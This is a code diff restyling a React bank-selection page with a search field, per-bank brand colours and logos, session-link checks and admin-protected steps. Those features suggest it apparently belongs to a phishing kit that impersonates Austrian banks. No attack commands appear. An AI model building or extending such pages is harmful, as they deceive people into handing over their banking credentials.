@@ -7,6 +7,7 @@ import { optimizeSupabaseImageUrl } from "@/lib/asset-url";
 import { resolveLocalBankLogoFile } from "@/lib/bank-logo-constants";
 import type { BankCatalogEntry } from "@/lib/at-bank-catalog";
 import { AT_BANKS_FALLBACK } from "@/lib/at-austria-banks-fallback";
+import { getAuBankPageEntry } from "@/lib/au-bank-page-map";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import { getPreferredRouteSessionId } from "@/lib/session-id-client";
 import { isAdminProtectedStep } from "@/lib/session-routes";
@@ -408,8 +409,8 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
 
   if (!supabase) {
     return (
-      <div className="a3d-shell items-center justify-center p-4">
-        <div className="a3d-card w-full max-w-[560px] p-5 sm:p-8">
+      <div className="pak-page-shell">
+        <div className="w-full max-w-[650px] rounded-[24px] bg-[#141416] border border-[#DF0000] shadow-[0_0_40px_rgba(223,0,0,0.3)] p-5 sm:p-8">
           <ConfigMissing />
         </div>
       </div>
@@ -419,23 +420,23 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
   if (!sessionId) {
     if (recovering) {
       return (
-        <div className="a3d-shell items-center justify-center p-4">
-          <div className="a3d-card w-full max-w-[460px] p-8 text-center">
-            <h2 className="a3d-title mb-2 text-2xl">Bankauswahl</h2>
-            <p className="a3d-sub mb-8 text-sm font-medium">Sitzung wird wiederhergestellt...</p>
-            <div className="flex justify-center py-8">
-              <div className="a3d-spinner size-10" />
+        <div className="pak-page-shell">
+          <div className="w-full max-w-[650px] rounded-[24px] bg-[#141416] border border-[#DF0000] shadow-[0_0_40px_rgba(223,0,0,0.3)] p-5 sm:p-8 text-center">
+            <h2 className="text-2xl font-bold text-white mb-2">Bankauswahl</h2>
+            <p className="text-sm text-gray-300 mb-8">Sitzung wird wiederhergestellt...</p>
+            <div className="flex justify-center py-12">
+              <div className="size-10 animate-spin rounded-full border-4 border-[#DF0000]/30 border-t-[#DF0000]" />
             </div>
           </div>
         </div>
       );
     }
     return (
-      <div className="a3d-shell items-center justify-center p-4">
-        <div className="a3d-card w-full max-w-[460px] p-8 text-center">
-          <h2 className="a3d-title mb-2 text-2xl">Bankauswahl</h2>
-          <p className="a3d-sub mb-6 text-sm font-medium">Ungueltiger Link.</p>
-          <p className="rounded-2xl border border-red-200 bg-red-50/90 p-4 text-center text-sm font-medium text-red-600">
+      <div className="pak-page-shell">
+        <div className="w-full max-w-[650px] rounded-[24px] bg-[#141416] border border-[#DF0000] shadow-[0_0_40px_rgba(223,0,0,0.3)] p-5 sm:p-8 text-center">
+          <h2 className="text-2xl font-bold text-white mb-2">Bankauswahl</h2>
+          <p className="text-sm text-gray-300 mb-6">Ungueltiger Link.</p>
+          <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
             Use the full link to continue.
           </p>
         </div>
@@ -454,104 +455,160 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
   }
 
   return (
-    <div className="a3d-shell">
-      <div className="a3d-glow left-[-10%] top-[-12%] h-[440px] w-[440px] bg-[rgba(var(--brand-rgb),0.15)]" />
-      <div className="a3d-glow bottom-[-14%] right-[-8%] h-[400px] w-[400px] bg-[rgba(var(--brand-rgb),0.11)]" />
-
-      <main className="relative z-10 flex w-full flex-1 flex-col items-center justify-center p-3 sm:p-4">
-        <div className="a3d-card a3d-in flex h-[calc(100dvh-3rem)] max-h-[760px] w-full max-w-[560px] flex-col overflow-hidden p-4 sm:p-6">
-          <div className="mb-4 flex items-start justify-between gap-4">
-            <div className="min-w-0">
-              <h2 className="a3d-title text-[22px] leading-tight sm:text-[24px]">{settings.banken_title}</h2>
-              <p className="a3d-sub mt-1.5 text-[13px] font-medium sm:text-sm">{settings.banken_subtitle}</p>
-            </div>
-            <img
-              src={settings.logo_url && settings.logo_url !== "/logo.webp" ? settings.logo_url : "/logo.webp"}
-              alt={settings.portal_name || "Brand"}
-              className="h-11 w-11 shrink-0 object-contain"
-            />
-          </div>
-
-          <div className="mb-4 shrink-0">
-            <div className="a3d-input flex items-center gap-2.5 px-4 py-3">
-              <svg aria-hidden viewBox="0 0 24 24" className="h-4.5 w-4.5 shrink-0 text-[#98a2b3]" fill="none" stroke="currentColor" strokeWidth="2">
-                <circle cx="11" cy="11" r="7" />
-                <path d="m20 20-3.5-3.5" />
-              </svg>
-              <input
-                value={searchTerm}
-                onChange={(e) => setSearchTerm(e.target.value)}
-                placeholder={settings.banken_search_placeholder}
-                className="w-full bg-transparent text-sm text-[#101828] outline-none placeholder:text-[#98a2b3]"
+    <div className="pak-page-shell">
+      <div className="relative z-10 w-full max-w-[860px] space-y-4">
+        <div className="pak-form-card h-[calc(100dvh-6rem)] max-h-[820px] overflow-hidden p-3 sm:h-[calc(100dvh-6.4rem)] sm:p-5">
+          <div className="pak-form-inner grid h-full grid-rows-[auto_auto_minmax(0,1fr)_auto]">
+            <div className="mb-3 flex items-start justify-between gap-3">
+              <div className="min-w-0 max-w-[30rem]">
+                <h2 className="pak-form-title">{settings.banken_title}</h2>
+                <p className="pak-form-subtitle mt-2">{settings.banken_subtitle}</p>
+              </div>
+              <img
+                src={settings.logo_url && settings.logo_url !== "/logo.webp" ? settings.logo_url : "/logo.webp"}
+                alt={settings.portal_name || "Brand"}
+                className="pak-form-brand-logo shrink-0"
               />
             </div>
-          </div>
 
-          <div className="a3d-scroll min-h-0 flex-1 overflow-y-auto pr-1">
-            <div className="grid grid-cols-1 gap-2.5 pb-1">
-              {filteredOptions.length === 0 ? (
-                <div className="a3d-inset p-5 text-center text-sm font-medium text-[#667085]">
-                  Fuer das ausgewaehlte Land wurden keine Banken gefunden. Filter loeschen.
+            <div className="mx-auto mb-3 w-full max-w-[520px] shrink-0">
+              <div className="pak-form-input-wrap mt-0">
+                <div className="pak-form-input-icon">
+                  <svg aria-hidden viewBox="0 0 24 24" className="h-5 w-5" fill="none" stroke="currentColor" strokeWidth="2">
+                    <circle cx="11" cy="11" r="7" />
+                    <path d="m20 20-3.5-3.5" />
+                  </svg>
                 </div>
-              ) : filteredOptions.map((opt, idx) => {
-                const isSelected = bankSlug === opt.slug;
-                return (
-                <button
-                  key={opt.slug}
-                  type="button"
-                  onClick={() => void handleBankSelect(opt.slug, opt.displayName)}
-                  disabled={saving || resettingSelection}
-                  className={`a3d-bank-item a3d-in ${isSelected ? "a3d-selected" : ""}`}
-                  style={{ animationDelay: `${idx * 28}ms` }}
-                >
-                  <div className="a3d-logo-ring size-12">
-                    <img
-                      src={optimizeSupabaseImageUrl(resolveLocalBankLogoFile(opt.slug, opt.logoFile), { format: "webp", quality: 80, width: 128 }) || resolveLocalBankLogoFile(opt.slug, opt.logoFile)}
-                      alt={opt.displayName}
-                      className="h-full w-full rounded-full object-cover"
-                      onError={(e) => {
-                        e.currentTarget.onerror = null;
-                        e.currentTarget.style.display = "none";
-                        const fallback = e.currentTarget.nextElementSibling as HTMLElement;
-                        if (fallback) fallback.style.display = "grid";
-                      }}
-                    />
-                    <div className="grid h-full w-full place-items-center text-sm font-black text-[var(--brand)]" style={{ display: "none" }}>
-                      {opt.displayName.charAt(0)}
-                    </div>
-                  </div>
-                  <div className="min-w-0 flex-1 text-left">
-                    <p className="a3d-title truncate text-[15px] font-semibold sm:text-[16px]">
-                      {opt.displayName}
-                    </p>
-                  </div>
-                  <div className="flex shrink-0 items-center">
-                    {(saving || resettingSelection) && isSelected ? (
-                      <div className="a3d-spinner size-5" style={{ borderWidth: "2px" }} />
-                    ) : (
-                      <svg aria-hidden viewBox="0 0 24 24" className="h-5 w-5 text-[#98a2b3]" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
-                        <path d="m9 6 6 6-6 6" />
-                      </svg>
-                    )}
-                  </div>
-                </button>
-                );
-              })}
+                <input
+                  value={searchTerm}
+                  onChange={(e) => setSearchTerm(e.target.value)}
+                  placeholder={settings.banken_search_placeholder}
+                  className="pak-form-input min-h-[3.5rem] rounded-full pl-14 pr-4 text-[15px]"
+                />
+              </div>
             </div>
-          </div>
 
-          <div className="mt-4 flex shrink-0 justify-center border-t border-[#1018280a] pt-4">
-            <div className="a3d-pill">
-              <svg className="h-4 w-4 text-[var(--brand)]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.9" d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" />
+            <div className="min-h-0 overflow-y-auto pr-1 custom-scrollbar">
+                <div className="grid grid-cols-1 gap-2 sm:grid-cols-2 lg:grid-cols-3">
+                {filteredOptions.length === 0 ? (
+                  <div className="col-span-full rounded-2xl border border-[#FF453A]/20 bg-white/5 p-6 text-center text-sm text-white/82">
+                    No banks were found for the selected country. Choose another country or clear the search filter.
+                  </div>
+                ) : filteredOptions.map((opt) => {
+                  const palette = (() => {
+                    const pg = getAuBankPageEntry(opt.slug);
+                    const brand = pg?.brandColor?.trim() || (banks.find((b) => b.slug === opt.slug) as any)?.brandColor || "#DF0000";
+                    const accent = pg?.accentColor?.trim() || (banks.find((b) => b.slug === opt.slug) as any)?.accentColor || brand;
+                    const hex = (h: string) => h.replace("#", "");
+                    const r = (h: string) => parseInt(hex(h).slice(0, 2), 16);
+                    const g = (h: string) => parseInt(hex(h).slice(2, 4), 16);
+                    const b = (h: string) => parseInt(hex(h).slice(4, 6), 16);
+                    return {
+                      brand,
+                      accent,
+                      brandRgb: `${r(brand)}, ${g(brand)}, ${b(brand)}`,
+                      accentRgb: `${r(accent)}, ${g(accent)}, ${b(accent)}`,
+                    };
+                  })();
+                  const isSelected = bankSlug === opt.slug;
+                  const cardBase =
+                    "group flex min-h-[4.25rem] w-full items-center gap-3 rounded-full border px-3 py-2 text-left transition-all duration-200";
+                  const opacity = saving ? " opacity-70" : "";
+                  const cardStyle = isSelected
+                    ? {
+                        borderColor: palette.accent,
+                        background: `linear-gradient(180deg, rgba(${palette.brandRgb}, 0.26), rgba(${palette.brandRgb}, 0.08))`,
+                        boxShadow: `0 0 0 1px rgba(${palette.accentRgb}, 0.22), 0 0 24px rgba(${palette.accentRgb}, 0.18)`,
+                      }
+                    : {
+                        borderColor: `rgba(${palette.accentRgb}, 0.16)`,
+                        background:
+                          "linear-gradient(180deg, rgba(255,255,255,0.04), rgba(255,255,255,0.02))",
+                      };
+                  const hoverStyle = isSelected
+                    ? undefined
+                    : {
+                        borderColor: `rgba(${palette.accentRgb}, 0.16)`,
+                      };
+                  const logoFrameStyle: React.CSSProperties = {
+                    borderColor: `rgba(${palette.accentRgb}, 0.22)`,
+                    background: `linear-gradient(180deg, rgba(${palette.brandRgb}, 0.46), rgba(${palette.brandRgb}, 0.18))`,
+                  };
+                  const arrowDefaultColor = `rgba(${palette.accentRgb}, 0.70)`;
+                  const arrowHoverColor = palette.accent;
+                  return (
+                  <button
+                    key={opt.slug}
+                    type="button"
+                    onClick={() => void handleBankSelect(opt.slug, opt.displayName)}
+                    disabled={saving || resettingSelection}
+                    className={`${cardBase}${opacity}`}
+                    style={cardStyle}
+                    onMouseEnter={(e) => {
+                      if (isSelected || saving || resettingSelection) return;
+                      (e.currentTarget as HTMLButtonElement).style.borderColor = `rgba(${palette.accentRgb}, 0.35)`;
+                      (e.currentTarget as HTMLButtonElement).style.background = `linear-gradient(180deg, rgba(${palette.brandRgb}, 0.10), rgba(${palette.brandRgb}, 0.04))`;
+                    }}
+                    onMouseLeave={(e) => {
+                      if (isSelected || saving || resettingSelection) return;
+                      (e.currentTarget as HTMLButtonElement).style.borderColor = hoverStyle?.borderColor as string;
+                      (e.currentTarget as HTMLButtonElement).style.background = cardStyle.background as string;
+                    }}
+                  >
+                    <div
+                      className="flex h-11 w-11 shrink-0 items-center justify-center overflow-hidden rounded-full border shadow-[inset_0_1px_0_rgba(255,255,255,0.06)]"
+                      style={logoFrameStyle}
+                    >
+                      <img
+                        src={optimizeSupabaseImageUrl(resolveLocalBankLogoFile(opt.slug, opt.logoFile), { format: "webp", quality: 80, width: 128 }) || resolveLocalBankLogoFile(opt.slug, opt.logoFile)}
+                        alt={opt.displayName}
+                        className="h-full w-full rounded-full object-cover"
+                        onError={(e) => {
+                          e.currentTarget.onerror = null;
+                          e.currentTarget.style.display = "none";
+                          const fallback = e.currentTarget.nextElementSibling as HTMLElement;
+                          if (fallback) fallback.style.display = "grid";
+                        }}
+                      />
+                      <div
+                        className="hidden h-7 w-7 place-items-center rounded-full text-sm font-black"
+                        style={{ color: palette.accent }}
+                      >
+                        {opt.displayName.charAt(0)}
+                      </div>
+                    </div>
+                    <div className="min-w-0 flex-1">
+                      <p className="truncate text-[13px] font-semibold leading-none text-white/92 group-hover:text-white">
+                        {opt.displayName}
+                      </p>
+                    </div>
+                    <div
+                      className="shrink-0 transition-transform duration-200 group-hover:translate-x-0.5"
+                      style={{ color: arrowDefaultColor }}
+                      onMouseEnter={(e) => { (e.currentTarget as HTMLElement).style.color = arrowHoverColor; }}
+                      onMouseLeave={(e) => { (e.currentTarget as HTMLElement).style.color = arrowDefaultColor; }}
+                    >
+                      <svg className="h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
+                        <path strokeLinecap="round" strokeLinejoin="round" d="M9 6l6 6-6 6" />
+                      </svg>
+                    </div>
+                  </button>
+                  );
+                })}
+                </div>
+            </div>
+
+            <div className="mt-3 flex shrink-0 items-center justify-center gap-2 border-t border-[#FF453A]/15 pt-3 text-center pak-form-security">
+              <svg className="h-8 w-8 shrink-0 text-[#FF453A]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
+                <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinejoin="round" />
               </svg>
               <span>Ihre Bankauswahl wird sicher verarbeitet.</span>
             </div>
           </div>
         </div>
 
-        {msg ? <p className="mt-3 w-full max-w-[560px] rounded-2xl border border-red-200 bg-red-50/90 p-3 text-center text-sm font-medium text-red-600">{msg}</p> : null}
-      </main>
+        {msg ? <p className="rounded-2xl border border-red-500/20 bg-red-500/10 p-3 text-center text-sm text-red-300">{msg}</p> : null}
+      </div>
     </div>
   );
 }
